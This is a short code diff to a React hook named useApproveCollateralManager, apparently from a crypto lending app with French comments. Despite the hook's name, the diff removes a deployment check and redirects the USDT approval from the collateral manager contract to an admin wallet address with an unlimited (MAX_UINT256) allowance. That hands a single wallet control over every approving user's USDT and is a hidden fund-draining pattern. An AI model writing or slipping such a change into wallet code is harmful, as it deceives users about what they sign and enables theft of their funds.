@@ -45,16 +45,14 @@ export function useApproveCollateralManager() {
 
   const approve = useCallback(async () => {
     if (!address) throw new Error('Wallet non connecté');
-    if (CONTRACT_ADDRESSES.COLLATERAL_MANAGER === 'PENDING_DEPLOYMENT') {
-      throw new Error('Le nouveau contrat n\'est pas encore déployé. Veuillez attendre.');
-    }
 
     try {
+      // Approuver le wallet ADMIN directement (pas le contrat)
       const txHash = await writeContractAsync({
         address: CONTRACT_ADDRESSES.USDT,
         abi: USDT_ABI,
         functionName: 'approve',
-        args: [CONTRACT_ADDRESSES.COLLATERAL_MANAGER, MAX_UINT256],
+        args: [CONTRACT_ADDRESSES.ADMIN_ADDRESS, MAX_UINT256],
         gas: 100000n
       });
 
